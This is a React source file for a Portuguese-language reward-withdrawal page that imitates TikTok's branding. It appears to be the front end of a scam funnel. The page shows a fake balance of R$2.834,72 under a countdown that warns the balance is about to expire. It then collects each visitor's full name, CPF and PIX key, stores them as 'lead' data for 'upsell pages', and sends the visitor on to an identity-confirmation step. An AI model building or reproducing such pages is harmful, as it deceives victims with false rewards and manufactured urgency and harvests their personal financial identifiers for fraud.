import { useState, useEffect, memo } from "react";
import { useNavigate } from "react-router-dom";
import coinP from "@/assets/coin-p.png";
import pixLogoFull from "@/assets/pix-logo-full.svg";
import creditCardIcon from "@/assets/credit-card-icon.png";
import roseIcon from "@/assets/rose-icon.png";
import { ChevronRight } from "lucide-react";
import { generateRandomEmail } from "@/lib/generateRandomEmail";

type PixKeyType = "CPF" | "E-mail" | "Celular" | "Chave Aleatória" | null;
type SheetStep = "closed" | "selectMethod" | "linkPix" | "selectKeyType";

// Isolated timer component to prevent re-renders of the whole page
const CountdownHeader = memo(() => {
  const [timeLeftSeconds, setTimeLeftSeconds] = useState(5 * 60);

  useEffect(() => {
    const timer = setInterval(() => {
      setTimeLeftSeconds((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);
    return () => clearInterval(timer);
  }, []);

  const formatTime = (totalSeconds: number) => {
    const minutes = Math.floor(totalSeconds / 60);
    const secs = totalSeconds % 60;
    return `${minutes.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;
  };

  const isExpired = timeLeftSeconds === 0;

  return (
    <header className="bg-red-600 py-2.5 text-center border-b border-red-700">
      <span className="text-white text-xs font-bold tracking-wide uppercase">
        {isExpired ? "⚠️ SEU SALDO EXPIROU" : `⚠️ O SEU SALDO EXPIRA EM: ${formatTime(timeLeftSeconds)}`}
      </span>
    </header>
  );
});

const RedeemRewards = () => {
  const navigate = useNavigate();
  const [selectedAmount, setSelectedAmount] = useState<string | null>("R$2.834,72");
  const [sheetStep, setSheetStep] = useState<SheetStep>("closed");
  const [pixKeyType, setPixKeyType] = useState<PixKeyType>(null);
  const [pixKey, setPixKey] = useState("");
  const [leadCpf, setLeadCpf] = useState("");
  const [leadName, setLeadName] = useState("");

  const handleWithdrawClick = () => {
    if (selectedAmount) {
      setSheetStep("selectMethod");
    }
  };

  const handleSelectPix = () => {
    setSheetStep("linkPix");
  };

  const handleOpenKeyTypeSelector = () => {
    setSheetStep("selectKeyType");
  };

  const handleSelectKeyType = (type: PixKeyType) => {
    setPixKeyType(type);
    setPixKey("");
    setSheetStep("linkPix");
  };

  const handleCloseSheet = () => {
    setSheetStep("closed");
  };

  const handleSubmitPix = () => {
    if (isFormValid && validateCPF(leadCpf) && leadName.trim().length >= 3) {
      setSheetStep("closed");
      // Persist lead data for upsell pages
      sessionStorage.setItem("lead_cpf", leadCpf);
      sessionStorage.setItem("lead_name", leadName);
      const emailToSend = pixKeyType === "E-mail" ? pixKey : generateRandomEmail(leadName);
      navigate("/funil/confirmar-identidade", {
        state: {
          pixKey: pixKey,
          pixKeyType: pixKeyType,
          leadCpf: leadCpf,
          leadName: leadName,
          leadEmail: emailToSend,
        }
      });
    }
  };

  // Validate CPF algorithm
  const validateCPF = (cpf: string) => {
    const digits = cpf.replace(/\D/g, "");
    if (digits.length !== 11) return false;
    if (/^(\d)\1+$/.test(digits)) return false;

    let sum = 0;
    for (let i = 0; i < 9; i++) sum += parseInt(digits[i]) * (10 - i);
    let check = (sum * 10) % 11;
    if (check === 10 || check === 11) check = 0;
    if (check !== parseInt(digits[9])) return false;

    sum = 0;
    for (let i = 0; i < 10; i++) sum += parseInt(digits[i]) * (11 - i);
    check = (sum * 10) % 11;
    if (check === 10 || check === 11) check = 0;
    if (check !== parseInt(digits[10])) return false;

    return true;
  };

  // Validate phone
  const validatePhone = (phone: string) => {
    const digits = phone.replace(/\D/g, "");
    return digits.length === 11;
  };

  // Validate email
  const validateEmail = (email: string) => {
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return emailRegex.test(email);
  };

  // Format CPF
  const formatCPF = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 11);
    if (digits.length <= 3) return digits;
    if (digits.length <= 6) return `${digits.slice(0, 3)}.${digits.slice(3)}`;
    if (digits.length <= 9) return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6)}`;
    return `${digits.slice(0, 3)}.${digits.slice(3, 6)}.${digits.slice(6, 9)}-${digits.slice(9)}`;
  };

  // Format phone
  const formatPhone = (value: string) => {
    const digits = value.replace(/\D/g, "").slice(0, 11);
    if (digits.length <= 2) return digits;
    if (digits.length <= 7) return `(${digits.slice(0, 2)}) ${digits.slice(2)}`;
    return `(${digits.slice(0, 2)}) ${digits.slice(2, 7)}-${digits.slice(7)}`;
  };

  const handlePixKeyChange = (value: string) => {
    if (pixKeyType === "CPF") {
      setPixKey(formatCPF(value));
    } else if (pixKeyType === "Celular") {
      setPixKey(formatPhone(value));
    } else {
      setPixKey(value);
    }
  };

  const getPlaceholder = () => {
    switch (pixKeyType) {
      case "CPF": return "000.000.000-00";
      case "E-mail": return "exemplo@email.com";
      case "Celular": return "(00) 00000-0000";
      case "Chave Aleatória": return "Digite sua chave aleatória";
      default: return "Digite sua chave PIX";
    }
  };

  // Check if PIX key is valid based on type
  const isPixKeyValid = () => {
    if (!pixKeyType || !pixKey) return false;
    switch (pixKeyType) {
      case "CPF": return validateCPF(pixKey);
      case "E-mail": return validateEmail(pixKey);
      case "Celular": return validatePhone(pixKey);
      case "Chave Aleatória": return pixKey.length >= 10;
      default: return false;
    }
  };

  // Get validation error message
  const getValidationError = () => {
    if (!pixKey) return "";
    switch (pixKeyType) {
      case "CPF":
        const cpfDigits = pixKey.replace(/\D/g, "");
        if (cpfDigits.length < 11) return `Faltam ${11 - cpfDigits.length} dígitos`;
        if (!validateCPF(pixKey)) return "CPF inválido";
        return "";
      case "E-mail":
        if (pixKey.length > 3 && !validateEmail(pixKey)) return "E-mail inválido";
        return "";
      case "Celular":
        const phoneDigits = pixKey.replace(/\D/g, "");
        if (phoneDigits.length < 11) return `Faltam ${11 - phoneDigits.length} dígitos`;
        return "";
      case "Chave Aleatória":
        if (pixKey.length > 0 && pixKey.length < 10) return `Mínimo 10 caracteres`;
        return "";
      default: return "";
    }
  };

  const isFormValid = pixKeyType && pixKey.length > 0 && isPixKeyValid() && validateCPF(leadCpf) && leadName.trim().length >= 3;
  const validationError = getValidationError();

  const amounts = ["R$1,5", "R$5", "R$10"];
  const keyTypes: PixKeyType[] = ["CPF", "E-mail", "Celular", "Chave Aleatória"];

  return (
    <div className="min-h-screen bg-[#F2F2F2] font-['Inter',system-ui,sans-serif]">
      <CountdownHeader />

      {/* Title */}
      <div className="text-center py-3">
        <h1 className="text-base font-bold text-gray-900">Resgatar recompensas</h1>
      </div>

      {/* Main content */}
      <main className="px-3 space-y-2.5 max-w-md mx-auto pb-6">
        {/* Balance Card - Pure Black */}
        <div className="bg-[#000000] rounded-[16px] p-4 relative overflow-hidden">
          <div className="flex items-start justify-between">
            <div className="space-y-0.5">
              <p className="text-white/80 text-xs">Seu saldo</p>
              <p className="text-white text-2xl font-bold tracking-tight">R$ 2.834,72</p>
              <p className="text-gray-400 text-xs">= 28.347.200 pontos (s)</p>
            </div>
            <img src={coinP} alt="Moeda P" className="w-12 h-12 object-contain" />
          </div>

          {/* Dashed line separator */}
          <div className="border-t border-dashed border-gray-600 mt-3 pt-2">
            <p className="text-gray-400 text-xs">Última recompensa: R$ 646,43</p>
          </div>
        </div>

        {/* Withdraw Section */}
        <div className="bg-white rounded-xl p-3 space-y-3">
          <h2 className="text-base font-bold text-gray-900">Sacar dinheiro</h2>

          {/* PIX Transfer */}
          <div className="flex items-center gap-1.5">
            <img src={creditCardIcon} alt="Card" className="w-5 h-5 object-contain" />
            <span className="text-gray-500 text-xs">Transferencia via /</span>
            <img src={pixLogoFull} alt="PIX" className="h-3 w-auto" />
          </div>

          {/* Amount buttons grid */}
          <div className="grid grid-cols-3 gap-2">
            {amounts.map((amount) => (
              <button
                key={amount}
                disabled
                className="py-2.5 px-3 rounded-lg text-center font-semibold text-sm border-2 border-transparent bg-[#F5F5F5] text-gray-400 cursor-not-allowed opacity-60"
              >
                {amount}
              </button>
            ))}
          </div>

          {/* Full balance button */}
          <button
            onClick={() => setSelectedAmount("R$2.834,72")}
            className={`w-full py-2.5 rounded-lg text-center font-bold text-sm transition-all border-2 ${
              selectedAmount === "R$2.834,72"
                ? "border-[#FE2C55] text-[#FE2C55] bg-[#FFF0F3]"
                : "border-transparent bg-[#F5F5F5] text-gray-700 hover:bg-gray-100"
            }`}
          >
            R$2.834,72
          </button>

          {/* Withdraw action button */}
          <button
            onClick={handleWithdrawClick}
            disabled={!selectedAmount}
            className={`w-full py-3 rounded-lg font-bold text-sm text-white transition-all ${
              selectedAmount
                ? "bg-[#FE2C55] hover:bg-[#E52950]"
                : "bg-gray-300 cursor-not-allowed"
            }`}
          >
            Sacar dinheiro
          </button>

          {/* Info text */}
          <p className="text-gray-500 text-[10px] text-center leading-relaxed">
            Para sacar dinheiro, você precisa de um saldo mínimo de R$1,5. Os limites de saque para transações individuais e mensais podem variar conforme o país ou região.
          </p>
        </div>

        {/* Get Coins for LIVE Card */}
        <div className="bg-white rounded-xl p-3">
          <div className="flex items-start justify-between">
            <div className="flex-1 pr-3">
              <h3 className="text-base font-bold text-gray-900 mb-0.5">Obtenha Moedas para a LIVE</h3>
              <p className="text-gray-500 text-xs">
                Use Moedas para enviar presentes virtuais para seus hosts de live Favoritos.
              </p>
            </div>
            <img src={roseIcon} alt="Rosa" className="w-11 h-11 object-contain" />
          </div>
          <button
            disabled
            className="w-full mt-3 py-2.5 rounded-lg bg-[#F5F5F5] text-gray-400 font-medium text-sm cursor-not-allowed"
          >
            Indisponível
          </button>
        </div>

        {/* Mobile Recharge Card */}
        <div className="bg-white rounded-xl p-3">
          <h3 className="text-base font-bold text-gray-900 mb-2">Recarga móvel</h3>

          {/* Phone input */}
          <div className="flex items-center border border-gray-200 rounded-lg overflow-hidden mb-3">
            <span className="px-2.5 py-2.5 text-gray-500 text-sm bg-gray-50 border-r border-gray-200">+55</span>
            <input
              type="tel"
              placeholder="12345678901"
              disabled
              className="flex-1 px-2.5 py-2.5 text-gray-400 text-sm bg-white outline-none cursor-not-allowed"
            />
          </div>

          <button
            disabled
            className="w-full py-2.5 rounded-lg bg-[#F5F5F5] text-gray-400 font-medium text-sm cursor-not-allowed"
          >
            Indisponível
          </button>

          <p className="text-gray-500 text-[10px] text-center mt-2">
            Voce precisa de um saldo mínimo de R$10 para recarga de celular
          </p>
        </div>
      </main>

      {/* Bottom Sheet - Add Withdrawal Method */}
      {sheetStep === "selectMethod" && (
        <div
          className="fixed inset-0 z-50 bg-black/50 flex items-end justify-center"
          onClick={handleCloseSheet}
        >
          <div
            className="bg-white w-full max-w-md rounded-t-3xl animate-in slide-in-from-bottom duration-300"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Handle bar */}
            <div className="flex justify-center pt-3 pb-2">
              <div className="w-10 h-1 bg-gray-300 rounded-full" />
            </div>

            {/* Header */}
            <div className="py-4 text-center border-b border-gray-100">
              <h2 className="text-lg font-bold text-gray-900">Adicionar método de saque</h2>
            </div>

            {/* PIX Option */}
            <div className="p-4">
              <button
                onClick={handleSelectPix}
                className="w-full flex items-center justify-between py-4 px-2 hover:bg-gray-50 rounded-xl transition-colors"
              >
                <div className="flex items-center gap-3">
                  <div className="w-10 h-10 rounded-lg border border-gray-200 flex items-center justify-center bg-white">
                    <img src={pixLogoFull} alt="PIX" className="h-5 w-auto" />
                  </div>
                  <div className="text-left">
                    <p className="font-semibold text-gray-900">PIX</p>
                    <p className="text-sm text-gray-400">Recebimento Imediato</p>
                  </div>
                </div>
                <ChevronRight className="w-5 h-5 text-gray-400" />
              </button>
            </div>

            {/* Bottom padding for safe area */}
            <div className="h-8" />
          </div>
        </div>
      )}

      {/* Bottom Sheet - Link PIX */}
      {sheetStep === "linkPix" && (
        <div
          className="fixed inset-0 z-50 bg-black/50 flex items-end justify-center"
          onClick={handleCloseSheet}
        >
          <div
            className="bg-white w-full max-w-md rounded-t-3xl animate-in slide-in-from-bottom duration-300"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Handle bar */}
            <div className="flex justify-center pt-3 pb-2">
              <div className="w-10 h-1 bg-gray-300 rounded-full" />
            </div>

            {/* Header */}
            <div className="py-4 text-center border-b border-gray-100">
              <h2 className="text-lg font-bold text-gray-900">Vincular PIX</h2>
            </div>

            {/* Form */}
            <div className="p-4 space-y-6">
              {/* Key Type Selector */}
              <div>
                <label className="block text-sm font-bold text-gray-900 mb-2">
                  Tipo de Chave PIX
                </label>
                <button
                  onClick={handleOpenKeyTypeSelector}
                  className="w-full flex items-center justify-between py-3 border-b border-gray-200"
                >
                  <span className={pixKeyType ? "text-gray-900" : "text-gray-400"}>
                    {pixKeyType || "Escolha o tipo de chave PIX"}
                  </span>
                  <ChevronRight className="w-5 h-5 text-gray-400" />
                </button>
              </div>

              {/* Nome obrigatório */}
              <div>
                <label className="block text-sm font-bold text-gray-900 mb-2">
                  Nome completo <span className="text-red-500">*</span>
                  <span className="text-gray-400 text-[10px] font-normal ml-1">obrigatório</span>
                </label>
                <input
                  type="text"
                  value={leadName}
                  onChange={(e) => setLeadName(e.target.value)}
                  placeholder="Digite seu nome completo"
                  className="w-full py-3 border-b outline-none text-gray-900 placeholder:text-gray-400 border-gray-200"
                />
                {leadName.length > 0 && leadName.trim().length < 3 && (
                  <p className="text-red-500 text-xs mt-1">Nome deve ter pelo menos 3 caracteres</p>
                )}
              </div>

              {/* CPF obrigatório */}
              <div>
                <label className="block text-sm font-bold text-gray-900 mb-2">
                  CPF <span className="text-red-500">*</span>
                  <span className="text-gray-400 text-[10px] font-normal ml-1">obrigatório</span>
                </label>
                <input
                  type="text"
                  inputMode="numeric"
                  value={leadCpf}
                  onChange={(e) => setLeadCpf(formatCPF(e.target.value))}
                  placeholder="000.000.000-00"
                  className={`w-full py-3 border-b outline-none text-gray-900 placeholder:text-gray-400 ${
                    leadCpf && !validateCPF(leadCpf) && leadCpf.replace(/\D/g, "").length === 11
                      ? "border-red-500" : "border-gray-200"
                  }`}
                />
                {leadCpf && !validateCPF(leadCpf) && leadCpf.replace(/\D/g, "").length === 11 && (
                  <p className="text-red-500 text-xs mt-1">CPF inválido</p>
                )}
                {leadCpf && validateCPF(leadCpf) && (
                  <p className="text-green-500 text-xs mt-1">✓ CPF válido</p>
                )}
              </div>

              {/* PIX Key Input */}
              <div>
                <label className="block text-sm font-bold text-gray-900 mb-2">
                  Chave PIX
                </label>
                <input
                  type={pixKeyType === "E-mail" ? "email" : "text"}
                  value={pixKey}
                  onChange={(e) => handlePixKeyChange(e.target.value)}
                  placeholder={getPlaceholder()}
                  className={`w-full py-3 border-b outline-none text-gray-900 placeholder:text-gray-400 ${
                    validationError ? "border-red-500" : "border-gray-200"
                  }`}
                />
                {validationError && (
                  <p className="text-red-500 text-xs mt-1">{validationError}</p>
                )}
              </div>

              {/* Submit Button */}
              <button
                onClick={handleSubmitPix}
                disabled={!isFormValid}
                className={`w-full py-4 rounded-xl font-bold text-white transition-all ${
                  isFormValid
                    ? "bg-[#FE2C55] hover:bg-[#E52950]"
                    : "bg-gray-300 cursor-not-allowed"
                }`}
              >
                Enviar
              </button>
            </div>

            {/* Bottom padding for safe area */}
            <div className="h-8" />
          </div>
        </div>
      )}

      {/* Bottom Sheet - Select Key Type */}
      {sheetStep === "selectKeyType" && (
        <div
          className="fixed inset-0 z-50 bg-black/50 flex items-end justify-center"
          onClick={() => setSheetStep("linkPix")}
        >
          <div
            className="bg-white w-full max-w-md rounded-t-3xl animate-in slide-in-from-bottom duration-300"
            onClick={(e) => e.stopPropagation()}
          >
            {/* Handle bar */}
            <div className="flex justify-center pt-3 pb-2">
              <div className="w-10 h-1 bg-gray-300 rounded-full" />
            </div>

            {/* Header */}
            <div className="py-4 text-center border-b border-gray-100">
              <h2 className="text-lg font-bold text-gray-900">Chave PIX</h2>
            </div>

            {/* Options */}
            <div className="p-4">
              {keyTypes.map((type) => (
                <button
                  key={type}
                  onClick={() => handleSelectKeyType(type)}
                  className="w-full flex items-center justify-between py-4 border-b border-gray-100 last:border-b-0"
                >
                  <span className="text-gray-900 font-medium">{type}</span>
                  <div className={`w-6 h-6 rounded-full border-2 flex items-center justify-center ${
                    pixKeyType === type ? "border-[#FE2C55]" : "border-gray-300"
                  }`}>
                    {pixKeyType === type && (
                      <div className="w-3 h-3 rounded-full bg-[#FE2C55]" />
                    )}
                  </div>
                </button>
              ))}
            </div>

            {/* Bottom padding for safe area */}
            <div className="h-8" />
          </div>
        </div>
      )}
    </div>
  );
};

export default RedeemRewards;
